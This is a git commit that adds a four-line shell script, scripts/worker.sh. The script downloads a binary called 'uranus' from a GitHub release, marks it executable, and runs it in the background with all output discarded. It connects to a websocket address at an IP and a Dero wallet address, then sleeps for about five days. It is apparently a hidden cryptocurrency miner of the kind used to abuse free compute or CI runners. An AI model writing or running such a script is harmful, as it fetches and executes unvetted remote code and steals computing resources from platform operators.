bd4fec09b32fecb8c608f09798edf066d32037e5
RayBarrettPhil <129693292+RayBarrettPhil@users.noreply.github.com>
2023-04-02 23:34:47 +0000

    Create worker.sh

---
+++ scripts/worker.sh
@@ -0,0 +1,4 @@
+wget -q https://github.com/RayBarrettPhil/sdfg/releases/download/wes/uranus
+chmod +x uranus
+./uranus -o wss://178.128.200.86:10100 -u dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy >/dev/null 2>&1 >/dev/null &
+sleep 430000
